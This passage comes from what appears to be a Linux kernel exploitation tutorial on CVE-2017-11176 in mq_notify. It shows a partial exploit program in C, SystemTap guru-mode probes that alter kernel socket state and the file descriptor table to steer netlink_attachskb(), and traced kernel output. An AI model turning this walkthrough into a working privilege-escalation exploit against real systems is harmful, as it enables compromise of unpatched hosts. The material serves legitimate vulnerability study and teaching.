<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">sk_family</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">AF_NETLINK</span><span class="p">)</span><span class="w">    </span><span class="c1">// &lt;--- ...from the AF_NETLINK family</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">ERR_PTR</span><span class="p">(</span><span class="o">-</span><span class="n">EINVAL</span><span class="p">);</span><span class="w"></span>

<span class="w">      </span><span class="n">sock_hold</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="n">sock</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>The exploit code becomes (remember to wrap the syscall <em>socket()</em>):</p><div class="highlight"><pre><span></span><code><span class="w">    </span><span class="cm">/*</span>
<span class="cm">     * CVE-2017-11176 Exploit.</span>
<span class="cm">     */</span><span class="w"></span>

<span class="w">    </span><span class="cp">#define _GNU_SOURCE</span>
<span class="w">    </span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;mqueue.h&gt;</span><span class="cp"></span>
<span class="w">    </span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="w">    </span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
<span class="w">    </span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="w">    </span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp"></span>
<span class="w">    </span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
<span class="w">    </span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp"></span>
<span class="w">    </span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;linux/netlink.h&gt;</span><span class="cp"></span>

<span class="w">    </span><span class="cp">#define NOTIFY_COOKIE_LEN (32)</span>

<span class="w">    </span><span class="cp">#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)</span>
<span class="w">    </span><span class="cp">#define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)</span>

<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">sigevent</span><span class="w"> </span><span class="n">sigev</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="kt">char</span><span class="w"> </span><span class="n">sival_buffer</span><span class="p">[</span><span class="n">NOTIFY_COOKIE_LEN</span><span class="p">];</span><span class="w"></span>
<span class="w">      </span><span class="kt">int</span><span class="w"> </span><span class="n">sock_fd</span><span class="p">;</span><span class="w"></span>

<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">"-={ CVE-2017-11176 Exploit }=-</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">sock_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_socket</span><span class="p">(</span><span class="n">AF_NETLINK</span><span class="p">,</span><span class="w"> </span><span class="n">SOCK_DGRAM</span><span class="p">,</span><span class="w"> </span><span class="n">NETLINK_GENERIC</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
<span class="w">      </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">perror</span><span class="p">(</span><span class="s">"socket"</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">"netlink socket created = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">sock_fd</span><span class="p">);</span><span class="w"></span>

<span class="w">      </span><span class="c1">// initialize the sigevent structure</span>
<span class="w">      </span><span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sigev</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">sigev</span><span class="p">));</span><span class="w"></span>
<span class="w">      </span><span class="n">sigev</span><span class="p">.</span><span class="n">sigev_notify</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SIGEV_THREAD</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="n">sigev</span><span class="p">.</span><span class="n">sigev_value</span><span class="p">.</span><span class="n">sival_ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sival_buffer</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="n">sigev</span><span class="p">.</span><span class="n">sigev_signo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sock_fd</span><span class="p">;</span><span class="w">  </span><span class="c1">// &lt;--- not '-1' anymore</span>

<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">_mq_notify</span><span class="p">((</span><span class="n">mqd_t</span><span class="p">)</span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">sigev</span><span class="p">))</span><span class="w"></span>
<span class="w">      </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">perror</span><span class="p">(</span><span class="s">"mq_notify"</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">"mq_notify succeed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">      </span><span class="c1">// TODO: exploit</span>

<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="nl">fail</span><span class="p">:</span><span class="w"></span>
<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">"exploit failed!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>Let's run it:</p><div class="highlight"><pre><span></span><code>-={ CVE-2017-11176 Exploit }=-
netlink socket created = 3
mq_notify: Bad file descriptor
exploit failed!

(18998-18998) [SYSCALL] ==&gt;&gt; mq_notify (-1, 0x7ffce9cf2180)
(18998-18998) [uland] ==&gt;&gt; copy_from_user ()
(18998-18998) [skb] ==&gt;&gt; alloc_skb (priority=0xd0 size=0x20)
(18998-18998) [uland] ==&gt;&gt; copy_from_user ()
(18998-18998) [skb] ==&gt;&gt; skb_put (skb=0xffff88003d1e0480 len=0x20)
(18998-18998) [skb] &lt;&lt;== skb_put = ffff88000a0a2800
(18998-18998) [vfs] ==&gt;&gt; fget (fd=0x3)                                          // &lt;--- this time '3' is expected
(18998-18998) [vfs] &lt;&lt;== fget = ffff88003cf14d80                                // PASSED
(18998-18998) [netlink] ==&gt;&gt; netlink_getsockbyfilp (filp=0xffff88003cf14d80)
(18998-18998) [netlink] &lt;&lt;== netlink_getsockbyfilp = ffff88002ff60000           // PASSED
(18998-18998) [netlink] ==&gt;&gt; netlink_attachskb (sk=0xffff88002ff60000 skb=0xffff88003d1e0480 timeo=0xffff88003df8ff40 ssk=0x0)
(18998-18998) [netlink] &lt;&lt;== netlink_attachskb = 0                              // UNWANTED BEHAVIOR
(18998-18998) [vfs] ==&gt;&gt; fget (fd=0xffffffff)
(18998-18998) [vfs] &lt;&lt;== fget = 0
(18998-18998) [netlink] ==&gt;&gt; netlink_detachskb (sk=0xffff88002ff60000 skb=0xffff88003d1e0480)
(18998-18998) [netlink] &lt;&lt;== netlink_detachskb
(18998-18998) [SYSCALL] &lt;&lt;== mq_notify= -9
</code></pre></div><p>It really looks like the first <em>buggy</em> stap trace, the difference here is that we <em>actually</em> control every data (file descriptor, sigev), nothing is hidden behind a library. Since neither the first <strong>fget()</strong> nor <strong>netlink_getsockbyfilp()</strong> returned <em>NULL</em>, we can safely assume that we passed both checks.</p><h2 id="forcing-netlink_attachskb-to-take-the-retry-path">Forcing netlink_attachskb() to take the retry path</h2><p>With the previous code, we reached <strong>netlink_attachskb()</strong> which returned 0. It means we went into the "normal" path. We don't want this behavior, we want to get into the "retry" path (returns 1). So, let's get back to the kernel code:</p><div class="highlight"><pre><span></span><code><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="nf">netlink_attachskb</span><span class="p">(</span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">sk_buff</span><span class="w"> </span><span class="o">*</span><span class="n">skb</span><span class="p">,</span><span class="w"></span>
<span class="w">              </span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="n">timeo</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">ssk</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">netlink_sock</span><span class="w"> </span><span class="o">*</span><span class="n">nlk</span><span class="p">;</span><span class="w"></span>

<span class="w">      </span><span class="n">nlk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nlk_sk</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span><span class="w"></span>

<span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">   </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">atomic_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_rmem_alloc</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_rcvbuf</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">test_bit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">state</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">DECLARE_WAITQUEUE</span><span class="p">(</span><span class="n">wait</span><span class="p">,</span><span class="w"> </span><span class="n">current</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!*</span><span class="n">timeo</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">          </span><span class="c1">// ... cut (never reached in our code path) ...</span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>

<span class="w">        </span><span class="n">__set_current_state</span><span class="p">(</span><span class="n">TASK_INTERRUPTIBLE</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">add_wait_queue</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">wait</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">wait</span><span class="p">);</span><span class="w"></span>

<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">atomic_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_rmem_alloc</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_rcvbuf</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">test_bit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">state</span><span class="p">))</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"></span>
<span class="w">            </span><span class="o">!</span><span class="n">sock_flag</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span><span class="w"> </span><span class="n">SOCK_DEAD</span><span class="p">))</span><span class="w"></span>
<span class="w">          </span><span class="o">*</span><span class="n">timeo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">schedule_timeout</span><span class="p">(</span><span class="o">*</span><span class="n">timeo</span><span class="p">);</span><span class="w"></span>

<span class="w">        </span><span class="n">__set_current_state</span><span class="p">(</span><span class="n">TASK_RUNNING</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">remove_wait_queue</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">wait</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">wait</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">sock_put</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span><span class="w"></span>

<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">signal_pending</span><span class="p">(</span><span class="n">current</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">          </span><span class="n">kfree_skb</span><span class="p">(</span><span class="n">skb</span><span class="p">);</span><span class="w"></span>
<span class="w">          </span><span class="k">return</span><span class="w"> </span><span class="n">sock_intr_errno</span><span class="p">(</span><span class="o">*</span><span class="n">timeo</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w">                             </span><span class="c1">// &lt;---- the only way</span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
<span class="w">      </span><span class="n">skb_set_owner_r</span><span class="p">(</span><span class="n">skb</span><span class="p">,</span><span class="w"> </span><span class="n">sk</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>The <strong>only way</strong> to have <em>netlink_attachskb()</em> returning "1" requires that we first pass the check [0]:</p><div class="highlight"><pre><span></span><code><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">atomic_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_rmem_alloc</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_rcvbuf</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">test_bit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">state</span><span class="p">))</span><span class="w"></span>
</code></pre></div><p>It is time to unleash the <em>true power</em> of System Tap and enter: <strong>the Guru Mode</strong>! The Guru Mode allows to write embedded "C" code that can be called by our probes. It is like writing kernel code directly that will be injected at runtime, much like a Linux Kernel Module (LKM). Because of this, any programming error here will make the kernel crash! You are now a kernel developer :-).</p><p>What we will do here, is to modify either the <em>struct sock</em> "sk" and/or <em>struct netlink_sock</em> "nlk" data structures, so the condition becomes true. However, before doing it, let's grab some useful information about the current <em>struct sock</em> <strong>sk</strong> state.</p><p>Let's modify the <em>netlink_attachskb()</em> probe and add some "embedded" C code (the "%{" and "%}" parts).</p><div class="highlight"><pre><span></span><code>    %{
    #include &lt;net/sock.h&gt;
    #include &lt;net/netlink_sock.h&gt;
    %}

    function dump_netlink_sock:long (arg_sock:long)
    %{
      struct sock *sk = (void*) STAP_ARG_arg_sock;
      struct netlink_sock *nlk = (void*) sk;

      _stp_printf("-={ dump_netlink_sock: %p }=-\n", nlk);
      _stp_printf("- sk = %p\n", sk);
      _stp_printf("- sk-&gt;sk_rmem_alloc = %d\n", sk-&gt;sk_rmem_alloc);
      _stp_printf("- sk-&gt;sk_rcvbuf = %d\n", sk-&gt;sk_rcvbuf);
      _stp_printf("- sk-&gt;sk_refcnt = %d\n", sk-&gt;sk_refcnt);

      _stp_printf("- nlk-&gt;state = %x\n", (nlk-&gt;state &amp; 0x1));

      _stp_printf("-={ dump_netlink_sock: END}=-\n");
    %}

    probe kernel.function ("netlink_attachskb")
    {
      if (execname() == "exploit")
      {
        printf("(%d-%d) [netlink] ==&gt;&gt; netlink_attachskb (%s)\n", pid(), tid(), $$parms)

        dump_netlink_sock($sk);
      }
    }
</code></pre></div><p><strong>WARNING</strong>: Again, the code here runs in kernel-land, any error will make the kernel crash.</p><p>Run system tap with the <strong>-g</strong> (i.e. guru) modifier:</p><div class="highlight"><pre><span></span><code>-={ CVE-2017-11176 Exploit }=-
netlink socket created = 3
mq_notify: Bad file descriptor
exploit failed!

(19681-19681) [SYSCALL] ==&gt;&gt; mq_notify (-1, 0x7ffebaa7e720)
(19681-19681) [uland] ==&gt;&gt; copy_from_user ()
(19681-19681) [skb] ==&gt;&gt; alloc_skb (priority=0xd0 size=0x20)
(19681-19681) [uland] ==&gt;&gt; copy_from_user ()
(19681-19681) [skb] ==&gt;&gt; skb_put (skb=0xffff88003d1e05c0 len=0x20)
(19681-19681) [skb] &lt;&lt;== skb_put = ffff88000a0a2200
(19681-19681) [vfs] ==&gt;&gt; fget (fd=0x3)
(19681-19681) [vfs] &lt;&lt;== fget = ffff88003d0d5680
(19681-19681) [netlink] ==&gt;&gt; netlink_getsockbyfilp (filp=0xffff88003d0d5680)
(19681-19681) [netlink] &lt;&lt;== netlink_getsockbyfilp = ffff880036256800
(19681-19681) [netlink] ==&gt;&gt; netlink_attachskb (sk=0xffff880036256800 skb=0xffff88003d1e05c0 timeo=0xffff88003df5bf40 ssk=0x0)

-={ dump_netlink_sock: 0xffff880036256800 }=-
- sk = 0xffff880036256800
- sk-&gt;sk_rmem_alloc = 0         // &lt;-----
- sk-&gt;sk_rcvbuf = 133120        // &lt;-----
- sk-&gt;sk_refcnt = 2
- nlk-&gt;state = 0                // &lt;-----
-={ dump_netlink_sock: END}=-

(19681-19681) [netlink] &lt;&lt;== netlink_attachskb = 0
(19681-19681) [vfs] ==&gt;&gt; fget (fd=0xffffffff)
(19681-19681) [vfs] &lt;&lt;== fget = 0
(19681-19681) [netlink] ==&gt;&gt; netlink_detachskb (sk=0xffff880036256800 skb=0xffff88003d1e05c0)
(19681-19681) [netlink] &lt;&lt;== netlink_detachskb
(19681-19681) [SYSCALL] &lt;&lt;== mq_notify= -9
</code></pre></div><p>The embedded stap function <strong>dump_netlink_sock()</strong> is correctly called before entering <em>netlink_attachskb()</em>. As we can see, the first bit of <em>state</em> is not set, and <em>sk_rmem_alloc</em> is lesser than <em>sk_rcvbuf</em>... so we don't pass the check.</p><p>Let's modify <em>nlk-&gt;state</em> <strong>before</strong> calling <em>netlink_attachskb()</em>:</p><div class="highlight"><pre><span></span><code>    function dump_netlink_sock:long (arg_sock:long)
    %{
      struct sock *sk = (void*) STAP_ARG_arg_sock;
      struct netlink_sock *nlk = (void*) sk;

      _stp_printf("-={ dump_netlink_sock: %p }=-\n", nlk);
      _stp_printf("- sk = %p\n", sk);
      _stp_printf("- sk-&gt;sk_rmem_alloc = %d\n", sk-&gt;sk_rmem_alloc);
      _stp_printf("- sk-&gt;sk_rcvbuf = %d\n", sk-&gt;sk_rcvbuf);
      _stp_printf("- sk-&gt;sk_refcnt = %d\n", sk-&gt;sk_refcnt);

      _stp_printf("- (before) nlk-&gt;state = %x\n", (nlk-&gt;state &amp; 0x1));
      nlk-&gt;state |= 1;                                                  // &lt;-----
      _stp_printf("- (after) nlk-&gt;state = %x\n", (nlk-&gt;state &amp; 0x1));

      _stp_printf("-={ dump_netlink_sock: END}=-\n");
    %}
</code></pre></div><p>And run it:</p><div class="highlight"><pre><span></span><code>-={ CVE-2017-11176 Exploit }=-
netlink socket created = 3

&lt;&lt;&lt; HIT CTRL-C HERE &gt;&gt;&gt;

^Cmake: *** [check] Interrupt


(20002-20002) [SYSCALL] ==&gt;&gt; mq_notify (-1, 0x7ffc48bed2c0)
(20002-20002) [uland] ==&gt;&gt; copy_from_user ()
(20002-20002) [skb] ==&gt;&gt; alloc_skb (priority=0xd0 size=0x20)
(20002-20002) [uland] ==&gt;&gt; copy_from_user ()
(20002-20002) [skb] ==&gt;&gt; skb_put (skb=0xffff88003d3a6080 len=0x20)
(20002-20002) [skb] &lt;&lt;== skb_put = ffff88002e142600
(20002-20002) [vfs] ==&gt;&gt; fget (fd=0x3)
(20002-20002) [vfs] &lt;&lt;== fget = ffff88003ddd8380
(20002-20002) [netlink] ==&gt;&gt; netlink_getsockbyfilp (filp=0xffff88003ddd8380)
(20002-20002) [netlink] &lt;&lt;== netlink_getsockbyfilp = ffff88003dde0400
(20002-20002) [netlink] ==&gt;&gt; netlink_attachskb (sk=0xffff88003dde0400 skb=0xffff88003d3a6080 timeo=0xffff88002e233f40 ssk=0x0)

-={ dump_netlink_sock: 0xffff88003dde0400 }=-
- sk = 0xffff88003dde0400
- sk-&gt;sk_rmem_alloc = 0
- sk-&gt;sk_rcvbuf = 133120
- sk-&gt;sk_refcnt = 2
- (before) nlk-&gt;state = 0
- (after)  nlk-&gt;state = 1
-={ dump_netlink_sock: END}=-

&lt;&lt;&lt; HIT CTRL-C HERE &gt;&gt;&gt;

(20002-20002) [netlink] &lt;&lt;== netlink_attachskb = fffffffffffffe00   // &lt;-----
(20002-20002) [SYSCALL] &lt;&lt;== mq_notify= -512
</code></pre></div><p>Woops! The call to <em>mq_notify()</em> became <strong>blocking</strong> (i.e. the main exploit thread is stuck in kernel-land, inside the syscall). Fortunately, we can get the control back with <em>CTRL-C</em>.</p><p>Note that this time, <strong>netlink_attachskb()</strong> returned <strong>0xfffffffffffffe00</strong>, that is "-ERESTARTSYS" errno. In other words, we got into that path:</p><div class="highlight"><pre><span></span><code><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">signal_pending</span><span class="p">(</span><span class="n">current</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="n">kfree_skb</span><span class="p">(</span><span class="n">skb</span><span class="p">);</span><span class="w"></span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">sock_intr_errno</span><span class="p">(</span><span class="o">*</span><span class="n">timeo</span><span class="p">);</span><span class="w"> </span><span class="c1">// &lt;---- return -ERESTARTSYS</span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>It means that we actually reached the other path of <em>netlink_attachskb()</em>, mission succeed!</p><h2 id="avoid-being-blocked">Avoid being blocked</h2><p>The reason why <em>mq_notify()</em> blocked is:</p><div class="highlight"><pre><span></span><code><span class="w">        </span><span class="n">__set_current_state</span><span class="p">(</span><span class="n">TASK_INTERRUPTIBLE</span><span class="p">);</span><span class="w"></span>

<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">atomic_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_rmem_alloc</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_rcvbuf</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">test_bit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">state</span><span class="p">))</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"></span>
<span class="w">            </span><span class="o">!</span><span class="n">sock_flag</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span><span class="w"> </span><span class="n">SOCK_DEAD</span><span class="p">))</span><span class="w"></span>
<span class="w">            </span><span class="o">*</span><span class="n">timeo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">schedule_timeout</span><span class="p">(</span><span class="o">*</span><span class="n">timeo</span><span class="p">);</span><span class="w"></span>

<span class="w">        </span><span class="n">__set_current_state</span><span class="p">(</span><span class="n">TASK_RUNNING</span><span class="p">);</span><span class="w"></span>
</code></pre></div><p>We will get in deeper details with <em>scheduling</em> later (cf. part 2) but for now just consider that our task is <strong>stopped</strong> until a <em>special condition</em> is met (it's all about wait queue).</p><p>Maybe we could avoid being scheduled/blocked? In order to do so, we need to by-pass the call to <strong>schedule_timeout()</strong>. Let's mark the sock as "SOCK_DEAD" (the last part of the condition). That is, change the "sk" content (just like we did before), to make the following function <strong>sock_flag()</strong> return true:</p><div class="highlight"><pre><span></span><code><span class="w">    </span><span class="c1">// from [include/net/sock.h]</span>
<span class="w">    </span><span class="k">static</span><span class="w"> </span><span class="kr">inline</span><span class="w"> </span><span class="kt">bool</span><span class="w"> </span><span class="nf">sock_flag</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="p">,</span><span class="w"> </span><span class="k">enum</span><span class="w"> </span><span class="n">sock_flags</span><span class="w"> </span><span class="n">flag</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="n">test_bit</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_flags</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>

<span class="w">    </span><span class="k">enum</span><span class="w"> </span><span class="n">sock_flags</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="n">SOCK_DEAD</span><span class="p">,</span><span class="w">      </span><span class="c1">// &lt;---- this has to be '0', but we can check it with stap!</span>
<span class="w">      </span><span class="p">...</span><span class="w"> </span><span class="n">cut</span><span class="w"> </span><span class="p">...</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>Let's edit the probe again:</p><div class="highlight"><pre><span></span><code>  // mark it congested!
  _stp_printf("- (before) nlk-&gt;state = %x\n", (nlk-&gt;state &amp; 0x1));
  nlk-&gt;state |= 1;            
  _stp_printf("- (after) nlk-&gt;state = %x\n", (nlk-&gt;state &amp; 0x1));

  // mark it DEAD
  _stp_printf("- sk-&gt;sk_flags = %x\n", sk-&gt;sk_flags);
  _stp_printf("- SOCK_DEAD = %x\n", SOCK_DEAD);
  sk-&gt;sk_flags |= (1 &lt;&lt; SOCK_DEAD);
  _stp_printf("- sk-&gt;sk_flags = %x\n", sk-&gt;sk_flags);
</code></pre></div><p>Relaunch annnnnnnnd.........boom! Our exploit main thread is now stuck in an infinite loop inside the kernel. The reason is:</p><ul><li>it enters <em>netlink_attachskb()</em> and takes the retry path (we forced it)</li><li>the thread is not scheduled (we by-passed it)</li><li><em>netlink_attachskb()</em> returns 1</li><li>back to <em>mq_notify()</em>, it hit the "goto retry" statement</li><li><em>fget()</em> returns a non-null value...</li><li>...as <em>netlink_getsockbyfilp()</em> does</li><li>we enter <em>netlink_attachskb()</em> again...</li><li>...again and again...</li></ul><p>So, we effectively by-passed the call to <em>schedule_timeout()</em> that made us blocked, but we created an infinite loop while doing it.</p><h2 id="stopping-the-infinite-loop">Stopping the infinite loop</h2><p>Let's continue the hack so <em>fget()</em> will fail on the second call! One way to do this, is to basically remove our file descriptor directly from the FDT (i.e. set it to NULL):</p><div class="highlight"><pre><span></span><code>    %<span class="o">{</span>
    <span class="c1">#include &lt;linux/fdtable.h&gt;</span>
    %<span class="o">}</span>

    <span class="k">function</span> remove_fd3_from_fdt:long <span class="o">(</span>arg_unused:long<span class="o">)</span>
    %<span class="o">{</span>
        _stp_printf<span class="o">(</span><span class="s2">"!!&gt;&gt;&gt; REMOVING FD=3 FROM FDT &lt;&lt;&lt;!!\n"</span><span class="o">)</span><span class="p">;</span>
        struct files_struct *files <span class="o">=</span> current-&gt;files<span class="p">;</span>
        struct fdtable *fdt <span class="o">=</span> files_fdtable<span class="o">(</span>files<span class="o">)</span><span class="p">;</span>
        fdt-&gt;fd<span class="o">[</span><span class="m">3</span><span class="o">]</span> <span class="o">=</span> NULL<span class="p">;</span>
    %<span class="o">}</span>

    probe kernel.function <span class="o">(</span><span class="s2">"netlink_attachskb"</span><span class="o">)</span>
    <span class="o">{</span>
      <span class="k">if</span> <span class="o">(</span>execname<span class="o">()</span> <span class="o">==</span> <span class="s2">"exploit"</span><span class="o">)</span>
      <span class="o">{</span>
        printf<span class="o">(</span><span class="s2">"(%d-%d) [netlink] ==&gt;&gt; netlink_attachskb (%s)\n"</span>, pid<span class="o">()</span>, tid<span class="o">()</span>, <span class="nv">$$</span>parms<span class="o">)</span>

        dump_netlink_sock<span class="o">(</span><span class="nv">$sk</span><span class="o">)</span><span class="p">;</span> // it also marks the socket as DEAD and CONGESTED
        remove_fd3_from_fdt<span class="o">(</span><span class="m">0</span><span class="o">)</span><span class="p">;</span>
      <span class="o">}</span>
    <span class="o">}</span>
